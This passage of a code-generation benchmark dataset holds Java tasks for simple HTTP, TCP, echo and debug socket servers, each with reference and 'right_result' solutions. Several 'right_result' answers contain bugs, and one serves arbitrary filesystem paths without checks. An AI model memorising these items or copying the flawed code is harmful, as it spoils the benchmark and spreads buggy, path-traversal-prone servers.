handle(method, path, headers, queries, input, response);\n                response.close();\n\n                conn.close();\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {}\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    protected void handle(String method, String path,\n                         HashMap<String, String> headers, Map<String, String> queries, InputStream input,\n                         OutputStream response) throws Exception {\n    }\n\n    private static Map<String, String> parsePath(String path) {\n        if (TextUtils.isEmpty(path)) {\n            return null;\n        }\n        int descriptionIndex = path.indexOf(\"/\");\n        if (descriptionIndex == -1) {\n            return null;\n        }\n        String description = path.substring(descriptionIndex + 1);\n        Map<String, String> queries = new HashMap<>();\n        int queryIndex = description.indexOf(\"?\");\n        if (queryIndex == -1) {\n            queries.put(ISchemaAction.DESCRIPTION, description);\n        } else {\n            queries.put(ISchemaAction.DESCRIPTION, description.substring(0, queryIndex));\n            description = description.substring(queryIndex + 1);\n        }\n        String[] arr = description.split(\"&\");\n        for (String segment : arr) {\n            String[] query = segment.split(\"=\");\n            if (query.length == 2) {\n                queries.put(query[0], query[1]);\n            } else if (query.length == 1) {\n                queries.put(query[0], \"\");\n            }\n        }\n        return queries;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic abstract class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(this).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!serverSocket.isClosed()) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            if (!serverSocket.isClosed()) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void handleClient(Socket socket) {\n        try (\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(input))\n        ) {\n            String line = reader.readLine();\n            if (line == null || line.isEmpty()) {\n                return;\n            }\n\n            String[] requestLine = line.split(\" \");\n            String method = requestLine[0];\n            String path = requestLine[1];\n\n            HashMap<String, String> headers = new HashMap<>();\n            String headerLine;\n            while (!(headerLine = reader.readLine()).isEmpty()) {\n                String[] parts = headerLine.split(\":\\\\s+\", 2);\n                if (parts.length == 2) {\n                    headers.put(parts[0].toLowerCase(), parts[1]);\n                }\n            }\n\n            Map<String, String> queries = parsePath(path);\n\n            handle(method, path, headers, queries, input, output);\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    protected abstract void handle(String method, String path, HashMap<String, String> headers, Map<String, String> queries, InputStream input, OutputStream response);\n\n    protected Map<String, String> parsePath(String path) {\n        Map<String, String> result = new HashMap<>();\n        int queryIndex = path.indexOf(\"?\");\n        if (queryIndex != -1) {\n            String queryString = path.substring(queryIndex + 1);\n            path = path.substring(0, queryIndex);\n            for (String param : queryString.split(\"&\")) {\n                String[] keyValue = param.split(\"=\", 2);\n                if (keyValue.length == 2) {\n                    result.put(keyValue[0], keyValue[1]);\n                } else if (keyValue.length == 1) {\n                    result.put(keyValue[0], \"\");\n                }\n            }\n        }\n        result.put(\"path\", path);\n        return result;\n    }\n}\n```"
  },
  {
    "Task_id": 551,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server capable of handling GET requests, serving both static files and dynamically generated class files through Javassist's ClassPool mechanism.\n\nClass Description: The Webserver class is a multi-threaded HTTP server that listens for incoming connections on a specified port. It can serve both static files from the filesystem and dynamically generated bytecode through Javassist's class manipulation capabilities. The server follows basic HTTP/1.0 protocol and handles each client connection in a separate thread.\n\nAttributes:\n- socket: ServerSocket - The main server socket listening for incoming connections\n- classPool: ClassPool - Javassist class pool for dynamic class generation\n- translator: Translator - Optional translator for class manipulation\n- endofline: byte[] - Constant for HTTP line endings (CRLF)\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- setClassPool(ClassPool loader) -> void - Sets the Javassist ClassPool for dynamic class generation\n- addTranslator(ClassPool cp, Translator t) -> void - Configures both ClassPool and Translator for advanced class manipulation\n- end() -> void - Closes the server socket and stops the server\n- run() -> void - Main server loop that accepts connections and spawns service threads\n- process(Socket clnt) -> void - Processes an individual client connection (handles HTTP protocol)\n- readLine(InputStream in) -> String - Reads a line of input from the client\n- skipLine(InputStream in) -> int - Skips a line of input from the client\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP request and generates appropriate response\n- letUsersSendClassfile(OutputStream out, String filename, int length) -> boolean - Handles dynamic class file generation and transmission\n- sendHeader(OutputStream out, long dataLength, int filetype) -> void - Sends HTTP response headers\n- replyError(OutputStream out, BadHttpRequest e) -> void - Sends HTTP error response",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\npublic class Webserver {\n    private ServerSocket socket;\n    private ClassPool classPool;\n    protected Translator translator;\n\n    private final static byte[] endofline = { 0x0d, 0x0a };\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n        classPool = null;\n        translator = null;\n    }\n\n    public void setClassPool(ClassPool loader) {\n        classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t)\n        throws NotFoundException, CannotCompileException\n    {\n        classPool = cp;\n        translator = t;\n        t.start(classPool);\n    }\n\n    public void end() throws IOException {\n        socket.close();\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        String cmd = readLine(in);\n        while (skipLine(in) > 0){\n        }\n\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            doReply(in, out, cmd);\n        }\n        catch (BadHttpRequest e) {\n            replyError(out, e);\n        }\n\n        out.flush();\n        in.close();\n        out.close();\n        clnt.close();\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuffer buf = new StringBuffer();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n\n        in.read();      /* skip 0x0a (LF) */\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n\n        in.read();      /* skip 0x0a (LF) */\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd)\n        throws IOException, BadHttpRequest\n    {\n        int len;\n        int fileType;\n        String filename, urlName;\n\n        if (cmd.startsWith(\"GET /\"))\n            filename = urlName = cmd.substring(5, cmd.indexOf(' ', 5));\n        else\n            throw new BadHttpRequest();\n\n        len = filename.length();\n        if (letUsersSendClassfile(out, filename, len))\n            return;\n\n        checkFilename(filename, len);\n        File file = new File(filename);\n        if (file.canRead()) {\n            sendHeader(out, file.length(), typeClass);\n            FileInputStream fin = new FileInputStream(file);\n            byte[] filebuffer = new byte[4096];\n            for (;;) {\n                len = fin.read(filebuffer);\n                if (len <= 0)\n                    break;\n                out.write(filebuffer, 0, len);\n            }\n\n            fin.close();\n            return;\n        }\n\n        throw new BadHttpRequest();\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out,\n                                          String filename, int length)\n        throws IOException, BadHttpRequest\n    {\n        if (classPool == null)\n            return false;\n\n        byte[] classfile;\n        String classname\n            = filename.substring(0, length - 6).replace('/', '.');\n        try {\n            if (translator != null)\n                translator.onLoad(classPool, classname);\n\n            CtClass c = classPool.get(classname);\n            classfile = c.toBytecode();\n        }\n        catch (Exception e) {\n            throw new BadHttpRequest(e);\n        }\n\n        sendHeader(out, classfile.length, typeClass);\n        out.write(classfile);\n        return true;\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 200 OK\".getBytes());\n        out.write(endofline);\n        out.write(\"Content-Length: \".getBytes());\n        out.write(Long.toString(dataLength).getBytes());\n        out.write(endofline);\n        out.write(\"Content-Type: application/octet-stream\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e)\n        throws IOException\n    {\n        out.write(\"HTTP/1.0 400 Bad Request\".getBytes());\n        out.write(endofline);\n        out.write(endofline);\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport javassist.ClassPool;\nimport javassist.Loader;\nimport javassist.Translator;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Webserver {\n    protected ServerSocket socket;\n    protected ClassPool classPool;\n    protected Translator translator;\n    private static final byte[] endofline = \"\\r\\n\".getBytes();\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n    }\n\n    public void setClassPool(ClassPool loader) {\n        this.classPool = loader;\n    }\n\n    public void addTranslator(ClassPool cp, Translator t) {\n        this.classPool = cp;\n        this.translator = t;\n        try {\n            classPool.insertBefore(t);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void end() throws IOException {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket client = socket.accept();\n                new Thread(() -> process(client)).start();\n            } catch (IOException e) {\n                break;\n            }\n        }\n    }\n\n    private void process(Socket clnt) {\n        try (InputStream in = clnt.getInputStream(); OutputStream out = clnt.getOutputStream();) {\n            String requestLine = readLine(in);\n            if (requestLine == null || requestLine.isEmpty()) {\n                return;\n            }\n\n            doReply(in, out, requestLine);\n        } catch (IOException | BadHttpRequest e) {\n            try {\n                replyError(clnt.getOutputStream(), e);\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        } finally {\n            try {\n                clnt.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) >= 0) {\n            char ch = (char) c;\n            if (ch == '\\r') {\n                skipLine(in);\n                return sb.toString();\n            } else if (ch == '\\n') {\n                return sb.toString();\n            } else {\n                sb.append(ch);\n            }\n        }\n        return sb.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int count = 0;\n        int c;\n        while ((c = in.read()) >= 0 && c != '\\n') {\n            count++;\n        }\n        if (c == '\\n') {\n            count++;\n        }\n        return count;\n    }\n\n    private void doReply(InputStream in, OutputStream out, String cmd) throws IOException, BadHttpRequest {\n        String[] tokens = cmd.split(\"\\\\s+\");\n        if (tokens.length < 3) {\n            throw new BadHttpRequest(\"Invalid request line\");\n        }\n\n        String method = tokens[0];\n        String path = tokens[1];\n\n        if (!method.equals(\"GET\")) {\n            throw new BadHttpRequest(\"Unsupported HTTP method: \" + method);\n        }\n\n        if (path.endsWith(\".class\") && classPool != null) {\n            letUsersSendClassfile(out, path.substring(1), -1);\n        } else {\n            sendStaticFile(path, out);\n        }\n    }\n\n    private void sendStaticFile(String path, OutputStream out) throws IOException {\n        File file = new File(path.startsWith(\"/\") ? path : \"/\" + path);\n        if (!file.exists()) {\n            sendHeader(out, -1, 404);\n            out.write(\"<html><body><h1>404 Not Found</h1></body></html>\".getBytes());\n            return;\n        }\n\n        sendHeader(out, file.length(), 200);\n        try (FileInputStream fis = new FileInputStream(file)) {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n        }\n    }\n\n    private boolean letUsersSendClassfile(OutputStream out, String filename, int length) throws IOException {\n        String className = filename.replace(\"/\", \".\").replace(\".class\", \"\");\n        try {\n            byte[] bytecode = classPool.get(className).toBytecode();\n            sendHeader(out, bytecode.length, 200);\n            out.write(bytecode);\n            return true;\n        } catch (Exception e) {\n            sendHeader(out, -1, 404);\n            out.write(\"<html><body><h1>404 Class Not Found</h1></body></html>\".getBytes());\n            return false;\n        }\n    }\n\n    private void sendHeader(OutputStream out, long dataLength, int filetype) throws IOException {\n        out.write((\"HTTP/1.0 \" + filetype + \" OK\" + new String(endofline)).getBytes());\n        out.write(\"Content-Type: application/octet-stream\".getBytes());\n        out.write(endofline);\n        if (dataLength >= 0) {\n            out.write((\"Content-Length: \" + dataLength + new String(endofline)).getBytes());\n        }\n        out.write(endofline);\n        out.flush();\n    }\n\n    private void replyError(OutputStream out, BadHttpRequest e) throws IOException {\n        sendHeader(out, -1, 400);\n        out.write(\"<html><body><h1>400 Bad Request</h1></body></html>\".getBytes());\n    }\n\n    static class BadHttpRequest extends Exception {\n        BadHttpRequest(String msg) {\n            super(msg);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 552,
    "Instruction": "Task Description: Implement a basic HTTP server in Java using ServerSocket that handles GET requests and responds with appropriate HTTP status codes.\n\nClass Description: The Webserver class represents a simple HTTP server that listens on a specified port, accepts client connections, processes HTTP GET requests, and sends responses. It uses multi-threading to handle multiple client connections simultaneously.\n\nAttributes:\n- socket: ServerSocket - The server socket that listens for incoming client connections\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Starts the server, continuously accepting client connections and spawning ServiceThreads to handle them\n- process(Socket clnt) -> void - Processes a client connection by reading the request and sending a response\n- readLine(InputStream in) -> String - Reads a line of text from the input stream until CRLF is encountered\n- skipLine(InputStream in) -> int - Skips a line in the input stream and returns its length\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP command and generates an appropriate response\n- replyError(OutputStream out, Exception e) -> void - Sends an HTTP error response to the client\n\nAdditional Class:\nServiceThread: A helper class that extends Thread to handle individual client connections in separate threads\n\nServiceThread Attributes:\n- web: Webserver - Reference to the main server instance\n- sock: Socket - The client socket connection\n\nServiceThread Methods:\n- ServiceThread(Webserver w, Socket s) -> void - Constructor that initializes the thread with server and client socket references\n- run() -> void - The thread's main execution method that processes the client request",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Webserver {\n    private ServerSocket socket;\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            String cmd = readLine(in);\n            while (skipLine(in) > 0) {}\n            doReply(in, out, cmd);\n        }\n        catch (Exception e) {\n            replyError(out, e);\n        }\n        finally {\n            out.flush();\n            in.close();\n            out.close();\n            clnt.close();\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n        in.read();\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n        in.read();\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd) throws IOException {\n        if (cmd.startsWith(\"GET /\")) {\n            String filename = cmd.substring(5, cmd.indexOf(' ', 5));\n            out.write(\"HTTP/1.0 200 OK\\r\\n\\r\\n\".getBytes());\n        }\n        else\n            throw new IOException(\"Bad Request\");\n    }\n\n    private void replyError(OutputStream out, Exception e) throws IOException {\n        out.write(\"HTTP/1.0 400 Bad Request\\r\\n\\r\\n\".getBytes());\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}\n\nclass ServiceThread extends Thread {\n    Webserver web;\n    Socket sock;\n\n    public ServiceThread(Webserver w, Socket s) {\n        web = w;\n        sock = s;\n    }\n\n    @Override\n    public void run() {\n        try {\n            web.process(sock);\n        }\n        catch (IOException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class Webserver {\n    protected ServerSocket socket;\n\n    public Webserver(int port) {\n        try {\n            socket = new ServerSocket(port);\n        } catch (IOException e) {\n            System.err.println(\"Could not start server on port \" + port);\n            System.exit(1);\n        }\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                Socket client = socket.accept();\n                ServiceThread st = new ServiceThread(this, client);\n                st.start();\n            }\n        } catch (IOException e) {\n            replyError(null, e);\n        }\n    }\n\n    public void process(Socket clnt) {\n        try {\n            InputStream in = clnt.getInputStream();\n            OutputStream out = clnt.getOutputStream();\n            String line = readLine(in);\n            if (line == null || line.isEmpty()) return;\n            int firstSpace = line.indexOf(' ');\n            int lastSpace = line.lastIndexOf(' ');\n            if (firstSpace <= 0 || lastSpace <= firstSpace + 1) return;\n            String cmd = line.substring(0, firstSpace).toLowerCase();\n            doReply(in, out, cmd);\n            clnt.close();\n        } catch (Exception e) {\n            replyError(clnt.getOutputStream(), e);\n        }\n    }\n\n    public String readLine(InputStream in) throws IOException {\n        byte[] buffer = new byte[8192];\n        int total = 0;\n        boolean done = false;\n        while (!done) {\n            int i;\n            for (i = 0; i < buffer.length && !done; i++) {\n                int b = in.read();\n                if (b == -1) {\n                    throw new EOFException();\n                }\n                buffer[i] = (byte) b;\n                if (buffer[i] == '\\n') {\n                    done = true;\n                    break;\n                }\n                if (i > 0 && buffer[i - 1] == '\\r' && buffer[i] == '\\n') {\n                    done = true;\n                    break;\n                }\n            }\n            if (i >= buffer.length) {\n                throw new IOException(\"Line too long\");\n            }\n            total += i;\n        }\n        if (total > 0 && buffer[total - 1] == '\\n') {\n            if (total > 1 && buffer[total - 2] == '\\r') {\n                total -= 2;\n            } else {\n                total--;\n            }\n        }\n        if (total <= 0) return \"\";\n        return new String(buffer, 0, total, \"ISO-8859-1\");\n    }\n\n    public int skipLine(InputStream in) throws IOException {\n        int count = 0;\n        int c;\n        while ((c = in.read()) != -1) {\n            count++;\n            if (c == '\\n') {\n                if (count > 1 && in.available() > 0 && in.read() == '\\r') {\n                    count++;\n                }\n                break;\n            }\n        }\n        return count;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd) throws IOException {\n        if (!cmd.equals(\"get\")) {\n            sendResponse(out, 501, \"Not Implemented\", \"Server does not support this method.\");\n            return;\n        }\n        sendResponse(out, 200, \"OK\", \"Hello from the server!\");\n    }\n\n    public void replyError(OutputStream out, Exception e) {\n        try {\n            if (out != null) {\n                sendResponse(out, 500, \"Internal Server Error\", \"An error occurred: \" + e.getMessage());\n            }\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n\n    private void sendResponse(OutputStream out, int code, String status, String message) throws IOException {\n        PrintWriter writer = new PrintWriter(out, true);\n        writer.println(\"HTTP/1.0 \" + code + \" \" + status);\n        writer.println(\"Content-Type: text/plain\");\n        writer.println(\"Content-Length: \" + message.length());\n        writer.println();\n        writer.print(message);\n        writer.flush();\n    }\n\n    static class ServiceThread extends Thread {\n        Webserver web;\n        Socket sock;\n\n        public ServiceThread(Webserver w, Socket s) {\n            web = w;\n            sock = s;\n        }\n\n        public void run() {\n            web.process(sock);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 553,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, handles each client connection in a separate thread, and processes incoming data from clients.\n\nClass Description: TCPServer is a Java class that implements a basic TCP server using ServerSocket. It listens on a specified port for incoming client connections, creates a new thread for each connected client, and reads UTF-encoded messages from clients. The server maintains a running state and properly closes resources when finished.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- started: boolean - Flag indicating whether the server is running\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, begins listening for connections, and creates new threads for each client\n- ClientHandler(Socket socket) -> void - Constructor for the inner client handler class (takes a client socket as parameter)\n- run() -> void - The thread's main execution method that reads data from the client (inherited from Thread)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        started = true;\n        System.out.println(\"Server started\");\n\n        try {\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                System.out.println(\"A client connected!\");\n                new ClientHandler(clientSocket).start();\n            }\n        } finally {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n        private DataInputStream inputStream;\n\n        public ClientHandler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.inputStream = new DataInputStream(socket.getInputStream());\n        }\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(inputStream.readUTF());\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (inputStream != null) {\n                        inputStream.close();\n                    }\n                    if (socket != null) {\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TCPServer extends Thread {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) {\n        new Thread(this).start();\n        try {\n            serverSocket = new ServerSocket(port);\n            started = true;\n            System.out.println(\"Server started on port \" + port);\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                new ClientHandler(clientSocket).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n\n        public ClientHandler(Socket socket) {\n            this.socket = socket;\n        }\n\n        public void run() {\n            try (\n                BufferedReader in = new BufferedReader(\n                    new InputStreamReader(socket.getInputStream()));\n                PrintWriter out = new PrintWriter(\n                    socket.getOutputStream(), true);\n            ) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    System.out.println(\"Received: \" + inputLine);\n                    out.println(\"Echo: \" + inputLine);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public void run() {\n        // This is the main thread's execution method if needed\n    }\n\n    public void stopServer() {\n        started = false;\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 554,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP echo server using ServerSocket to listen for client connections, receive messages, and send them back to the client with an \"ECHO : \" prefix until the client sends \"bye\" or an empty message.\n\nClass Description: The EchoServer class represents a TCP server that echoes back received messages to connected clients. It handles client connections, message processing, and resource cleanup.\n\nAttributes:\n- server: [ServerSocket] - The server socket listening for incoming connections\n- client: [Socket] - The socket representing the connected client\n- out: [PrintStream] - Output stream to send data to the client\n- buf: [BufferedReader] - Input stream to read data from the client\n- flag: [boolean] - Control flag for the server's main loop\n\nMethods:\n- EchoServer(int port) -> [void] - Constructor that initializes the server socket on the specified port\n- start() -> [void] - Starts the server, accepts client connections, and begins echoing messages\n- close() -> [void] - Closes client and server sockets to release resources",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoServer {\n\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n    private BufferedReader buf;\n    private boolean flag;\n\n    public EchoServer(int port) throws Exception {\n        server = new ServerSocket(port);\n        flag = true;\n    }\n\n    public void start() throws Exception {\n        System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\");\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        while (flag) {\n            String str = buf.readLine();\n            if (str == null || \"\".equals(str)) {\n                flag = false;\n            } else {\n                if (\"bye\".equals(str)) {\n                    flag = false;\n                } else {\n                    out.println(\"ECHO : \" + str);\n                }\n            }\n        }\n    }\n\n    public void close() throws Exception {\n        client.close();\n        server.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class EchoServer {\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n    private BufferedReader buf;\n    private boolean flag = true;\n\n    public EchoServer(int port) {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            System.out.println(\"Echo server started...\");\n            client = server.accept();\n            System.out.println(\"Client connected: \" + client.getInetAddress());\n\n            out = new PrintStream(client.getOutputStream());\n            buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n\n            String message;\n            while (flag && (message = buf.readLine()) != null) {\n                if (message.trim().equalsIgnoreCase(\"bye\") || message.trim().isEmpty()) {\n                    flag = false;\n                } else {\n                    out.println(\"ECHO : \" + message);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            close();\n        }\n    }\n\n    public void close() {\n        try {\n            if (buf != null) buf.close();\n            if (out != null) out.close();\n            if (client != null) client.close();\n            if (server != null) server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 555,
    "Instruction": "Task Description: Create a TCP server class that handles multiple types of client requests through socket communication, supporting operations like content updates, progress tracking, and layout management.\n\nClass Description: LinkServer is a TCP server implementation that listens on a specified port for incoming client connections. It handles different types of requests defined by operation codes, manages client connections in separate threads, and provides bidirectional communication through input/output streams.\n\nAttributes:\n- server: ServerSocket - The main server socket that listens for incoming connections\n- port: int - The port number on which the server listens (default: 9999)\n- UPDATE_CONTENT: int - Constant for content update operation (value: 1)\n- UPDATE_PROGRESS: int - Constant for progress update operation (value: 2)\n- GET_CURRENT_CONTENT: int - Constant for content retrieval operation (value: 3)\n- SET_DRAW_DEBUG: int - Constant for debug mode setting operation (value: 4)\n- GET_LAYOUT_LIST: int - Constant for layout list retrieval operation (value: 5)\n- GET_CURRENT_LAYOUT: int - Constant for current layout retrieval operation (value: 6)\n- UPDATE_LAYOUT_DIMENSIONS: int - Constant for layout dimensions update operation (value: 7)\n\nMethods:\n- LinkServer() -> void - Default constructor initializes server with default port\n- LinkServer(int port) -> void - Constructor that takes a custom port number\n- init() -> void - Initializes the ServerSocket instance\n- start() -> void - Starts the server and begins accepting client connections in a dedicated thread\n- handleRequest(Socket socket) -> void - Handles client requests in a separate thread (Input: client socket)\n- closeConnection(Socket socket) -> void - Closes the client socket connection (Input: client socket to close)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Set;\n\npublic class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n\n    final int UPDATE_CONTENT = 1;\n    final int UPDATE_PROGRESS = 2;\n    final int GET_CURRENT_CONTENT = 3;\n    final int SET_DRAW_DEBUG = 4;\n    final int GET_LAYOUT_LIST = 5;\n    final int GET_CURRENT_LAYOUT = 6;\n    final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {\n        init();\n        start();\n    }\n\n    public LinkServer(int port) {\n        this.port = port;\n        init();\n        start();\n    }\n\n    private void init() {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void start() {\n        Thread t = new Thread(() -> {\n            try {\n                while (true) {\n                    Socket client = server.accept();\n                    Thread acceptThread = new Thread(() -> handleRequest(client));\n                    acceptThread.start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        t.setName(\"Link Debug Thread\");\n        t.start();\n    }\n\n    void handleRequest(Socket socket) {\n        boolean running = true;\n        DataInputStream reader;\n        DataOutputStream writer;\n        try {\n            reader = new DataInputStream(socket.getInputStream());\n            writer = new DataOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n\n        while (running) {\n            try {\n                int type = reader.readInt();\n                String name = reader.readUTF();\n                switch (type) {\n                    case UPDATE_CONTENT:\n                        String content = reader.readUTF();\n                        break;\n                    case UPDATE_PROGRESS:\n                        float progress = reader.readFloat();\n                        break;\n                    case GET_CURRENT_CONTENT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case SET_DRAW_DEBUG:\n                        boolean drawDebug = 